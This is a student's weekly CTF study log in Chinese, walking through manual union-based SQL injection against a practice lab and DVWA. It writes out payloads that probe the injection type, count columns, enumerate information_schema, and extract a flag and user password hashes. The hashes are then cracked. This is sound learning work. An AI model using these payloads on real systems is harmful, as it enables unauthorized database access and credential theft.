## 本周重点
### 1.知识分享
一、sql手注
先输入id=1测试能否注入
![b3f966f1e8beb5ccbfb6c9819e9a5f6b.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699199406245-d7479a27-c4ea-463a-b0d8-23bc472b0899.png#averageHue=%2383d009&clientId=ua474264a-bcff-4&from=paste&height=281&id=u41dfc2eb&originHeight=351&originWidth=1041&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29515&status=done&style=none&taskId=u49ce87a9-57b9-44f5-86e0-d52f2f4ff9c&title=&width=832.8)
然后分别注入id=1 and 1=1和id=1 and 1=2，若后者显示报错则为数字型注入，但此题并没有出现。
![fac036c870b2dccf32ce4c75a7c2ec90.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699200005692-8c73a9be-8629-4856-93a1-a8e321b900a8.png#averageHue=%2382cf09&clientId=ua474264a-bcff-4&from=paste&height=250&id=ua308a3f7&originHeight=313&originWidth=633&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23228&status=done&style=none&taskId=u4b894828-78c0-4f77-874f-3c0099de575&title=&width=506.4)
![5686766c6dc6c9791cf1aef888452963.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699200035741-9fae1645-b82b-4bb5-885f-4b8a7bd93b9f.png#averageHue=%2389d309&clientId=ua474264a-bcff-4&from=paste&height=262&id=uf2e68b45&originHeight=327&originWidth=500&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20114&status=done&style=none&taskId=ud5ca5c56-0679-47da-9880-57acd89a1b6&title=&width=400)
然后测试id=1' and 1=1 -- q和id=1' and 1=2 -- q若后者报错则为字符型注入，这题明显为字符型。
![8205a12d52b7d03accb8f44a90da0648.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699200330583-b565c4a8-adc5-4dea-aa79-e6683305bf76.png#averageHue=%2389d309&clientId=ua474264a-bcff-4&from=paste&height=254&id=u17cf091b&originHeight=318&originWidth=578&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21673&status=done&style=none&taskId=uc3c6df64-6d26-4062-8ab7-a7ddc03ea7d&title=&width=462.4)
![ed598d21cca99facfcdca5f3aca9ac6b.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699200339966-3fa338e9-c889-44a1-b33a-f28c2e4413c5.png#averageHue=%23c4ac47&clientId=ua474264a-bcff-4&from=paste&height=189&id=ubf534442&originHeight=236&originWidth=529&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12792&status=done&style=none&taskId=u1263e678-005d-4189-8ac5-060e952d1e0&title=&width=423.2)
下一步判断列数，用id=1' order by [num] -- q测试，当注入到4时报错了说明列数为3
![787e7e2f6747df921ab414ff352dd01f.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699200479617-030a89aa-d62c-4532-8313-017f4a44ec79.png#averageHue=%23cacc13&clientId=ua474264a-bcff-4&from=paste&height=206&id=uea700ef1&originHeight=257&originWidth=517&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14671&status=done&style=none&taskId=ua7d95619-0cf5-4f6e-98f2-9607892d817&title=&width=413.6)
然后判断显示位，用id=-1' union select 1,2,3 -- q来注入得到2,3为回显位
![9f5c1fa9a9dacf62e2dc2b15aae454d2.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699200658447-0006cc29-b3ee-4431-a6d3-ee9ed6d2c831.png#averageHue=%238bd30b&clientId=ua474264a-bcff-4&from=paste&height=252&id=u63619455&originHeight=315&originWidth=652&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21389&status=done&style=none&taskId=uf9da737e-a285-46ae-af3c-df92f737840&title=&width=521.6)
康康数据库名注入id=-1' union select 1,database(),3 -- q
（在回显为注入database()就行）得到security
![64eb13885604c81a5a75a5edd5a4202d.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699200847387-078fd0d7-dcaf-41f2-881b-02fa092c22a7.png#averageHue=%2388d409&clientId=ua474264a-bcff-4&from=paste&height=241&id=ue6524947&originHeight=301&originWidth=748&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23672&status=done&style=none&taskId=u2a5f2062-e3e5-4c9c-916f-ad326472c4b&title=&width=598.4)
![0d50edf83509fa19d4ebd433bac15699.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699200943151-7fa5c2d1-c6f3-4874-993d-5e0741561c8e.png#averageHue=%238ad309&clientId=ua474264a-bcff-4&from=paste&height=230&id=u3a6318d0&originHeight=288&originWidth=673&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22808&status=done&style=none&taskId=ua8123782-e43d-46c3-a9b3-6398bfc14c4&title=&width=538.4)
得到库名就可以开始查表名了，注入
`id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- q`
（同上group_concat(table_name)查表代码只要放在回显位就行）看到flag表了
![11aa70bbd3a26e784d36bf2022fd01d3.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699201194832-55c659f3-2597-435e-b395-a3e51164a327.png#averageHue=%238ecd14&clientId=ua474264a-bcff-4&from=paste&height=257&id=u80d4e4d0&originHeight=321&originWidth=1080&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34503&status=done&style=none&taskId=u25adfa1f-90c0-4b07-9bda-27f64138301&title=&width=864)
找到目标表再接着查目标表的段名，注入
`id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='flag' -- q`
看到就id和flag两个段，那直接查flag段的数据就行
![4130e407c0af70c53e821ae9792340df.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699201568836-d04df276-75f7-4439-8177-86bf9ff3f8da.png#averageHue=%2399c71b&clientId=ua474264a-bcff-4&from=paste&height=245&id=u189b7c4d&originHeight=306&originWidth=877&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27253&status=done&style=none&taskId=ucb1063f5-d6b6-4087-823e-96f8c96a3e0&title=&width=701.6)
注入?id=-1' union select 1,2,group_concat(0x7e,flag) from security.flag -- q得到flag
![5b7218b093a80bdf520780b748514735.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699202183365-6a89fa14-ee3d-454b-a978-9fd18a754529.png#averageHue=%238bcf10&clientId=ua474264a-bcff-4&from=paste&height=261&id=u960564bf&originHeight=326&originWidth=1040&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37853&status=done&style=none&taskId=u6a649b63-93a4-43af-be92-6b94c3c0b88&title=&width=832)
二、dvwa sql
注入1有回显结果，而1’则是报错
![df1c815357913b6dc1050b40bcb149c4.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699203638593-fb4a032e-cd57-40a6-9156-8938bcc86b14.png#averageHue=%23f7f9f9&clientId=ua474264a-bcff-4&from=paste&height=116&id=u9354a664&originHeight=145&originWidth=340&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2269&status=done&style=none&taskId=udafe5d3f-2c3c-41c2-8c24-cc8fefe1bd7&title=&width=272)
![50d588226f9d4677929a3eb0ca571a7a.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699204066230-be4c6362-ff8d-4ee9-a113-6100a841ef9d.png#averageHue=%23f5f5f5&clientId=ua474264a-bcff-4&from=paste&height=47&id=u3223c341&originHeight=59&originWidth=1263&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3395&status=done&style=none&taskId=uaf4c8dee-15ec-40b9-95b7-41b054e0439&title=&width=1010.4)
所以我们验证一下是不是数字型注入按照上面方法发现当注入1 and 1=2时却没有报错
![3ff90e5f4eb8e9c498324fa84cc5cd12.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699204188568-9e5d3945-817a-40e5-b80d-5b4fdc4de899.png#averageHue=%23f7f9f9&clientId=ua474264a-bcff-4&from=paste&height=118&id=u916b18bf&originHeight=148&originWidth=363&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2497&status=done&style=none&taskId=ufcd9b193-7e75-4a41-af42-db4c047bd7a&title=&width=290.4)
![d7e5c5ad6c04c7381fa99954f1544d4e.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699204196424-28af3ea0-01aa-4609-9f3d-f00c94b7aac5.png#averageHue=%23f7f9f9&clientId=ua474264a-bcff-4&from=paste&height=101&id=ud6c819fa&originHeight=126&originWidth=343&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2355&status=done&style=none&taskId=uc2693038-d6d2-4838-881c-56e7be283f2&title=&width=274.4)
那大概率就不是数字型了，然后我们验证字符型
构造了1' and 1=1#和1' and 1=2#发现后者无回显可知为字符型
![abc3d873862f4b293dd81e110b85b37f.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699204411275-2b83ab68-5092-4384-8bc7-1b26b478a9eb.png#averageHue=%23f7f9f9&clientId=ua474264a-bcff-4&from=paste&height=116&id=u5fa01297&originHeight=145&originWidth=365&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2540&status=done&style=none&taskId=uc514e816-929e-4c39-8583-bf91f934bdc&title=&width=292)
![87446d82f147c12e10592241d3b33776.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699204418605-5bf8238a-615c-489b-902d-171b01c3b17f.png#averageHue=%239c9d98&clientId=ua474264a-bcff-4&from=paste&height=244&id=ud6bc9143&originHeight=305&originWidth=564&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22962&status=done&style=none&taskId=u5c835d82-df64-4372-a86f-fbd75bce469&title=&width=451.2)
然后我们来爆列数，爆到3报错，说明两列
![1aa008c22842c0c65a38d725ab2c8f43.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699204577782-ca17ae15-88f0-481f-baaf-c4713962d9d3.png#averageHue=%23f5f5f5&clientId=ua474264a-bcff-4&from=paste&height=38&id=ud9996585&originHeight=47&originWidth=330&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1077&status=done&style=none&taskId=uadbab37d-3350-484f-b8c1-5d5be9043eb&title=&width=264)
爆回显看到1，2都可回显，后面个人习惯就用2
![18b809c49297a75e8a1d6c8f1715f110.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699204700830-d03286d5-b3c0-4b76-a884-fd130e0e6c0b.png#averageHue=%23f7f9f9&clientId=ua474264a-bcff-4&from=paste&height=109&id=u1483d462&originHeight=136&originWidth=378&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2660&status=done&style=none&taskId=u9f87e2fc-1f5a-464f-ae9a-724bb63fcdb&title=&width=302.4)
爆库名得到dvwa
![ae2d5e02f34b38d5a9c08bb4d4db46d2.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699204800141-389a3c94-cf17-4f43-97cd-29f5f0f1db28.png#averageHue=%23f7f9f9&clientId=ua474264a-bcff-4&from=paste&height=74&id=u4a39ef08&originHeight=93&originWidth=413&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1872&status=done&style=none&taskId=u1d92c981-c78e-4543-9901-cbf2715085e&title=&width=330.4)
接着爆表发现union联合查询注入报错，学了波修代码
![b22d0f1cc73ae8033c908890972f1f27.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699205062222-0dc7ab90-c31e-4769-a6fb-c9a32698b18d.png#averageHue=%23f6f6f6&clientId=ua474264a-bcff-4&from=paste&height=42&id=u8309ea00&originHeight=52&originWidth=450&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1471&status=done&style=none&taskId=u2ac9388e-5a4b-4b04-a2ab-1ef6ed381ab&title=&width=360)
修好后可以正常爆表有guestbook和users两个表
![3d9217eec102e4bee0c350d7976b8888.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699207025584-7e7e8446-1535-4b8c-874e-45a3b9d856d4.png#averageHue=%239abc9a&clientId=ua474264a-bcff-4&from=paste&height=139&id=u80fb1544&originHeight=174&originWidth=982&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5951&status=done&style=none&taskId=u5ce0f25d-8105-4fc6-b6c5-0d71d7209a2&title=&width=785.6)
既然sql注入那我们就爆账户密码表users可以看到user和password两个段表，我们爆这俩的数据
![dd0196147c4d46432775d70c20e03087.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699207327432-104cc5d9-a5fd-4a25-8953-d32e8af36432.png#averageHue=%239abc9a&clientId=ua474264a-bcff-4&from=paste&height=91&id=u8aaf3e8c&originHeight=114&originWidth=1163&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8081&status=done&style=none&taskId=u341e23af-e012-445d-8167-f10d9a901d2&title=&width=930.4)
得到账户密码，密码是md5加密的
![5d2dca02d135030d2f8e27c0628cf0ec.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699207588499-0dc456de-cddd-4241-9d16-dbd77f51461f.png#averageHue=%23f0f3bd&clientId=ua474264a-bcff-4&from=paste&height=179&id=ufa64fa5c&originHeight=224&originWidth=1449&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12800&status=done&style=none&taskId=ue2c287c6-fd9d-4a0a-b8f9-2f7287459a2&title=&width=1159.2)
解密md5得到admin的密码
![83f8f17e90c48c41a237bfab409511ba.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699207695714-21033f89-f7fb-428b-bb2c-4d9e65e73190.png#averageHue=%23e0e2b0&clientId=ua474264a-bcff-4&from=paste&height=162&id=u4e2e68cd&originHeight=203&originWidth=834&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6320&status=done&style=none&taskId=u4b073230-1207-4858-b740-86759a8f519&title=&width=667.2)
## 下周计划

- isCTF
- 极客大挑战
- 复现newstar
## 总结
终于把课外八学分搞定了，然后就是算是第一次团队正式比赛鹏城杯却坐牢了，除了web1其他都没思路，misc三段flag只出了两段真的糟心，下次isCTF要努力了，sql注入迈出了第一步手注和sqlmap都实验了，下一步大概是bool希望早日学号盲注，一种注入应该更好引申到另一种注入，比如最近比赛出现频率很高的ssti注入。已经复现了好多前期比赛的题，学到一些新的漏洞，但还没好好总结，还有些新的工具和解题方法。

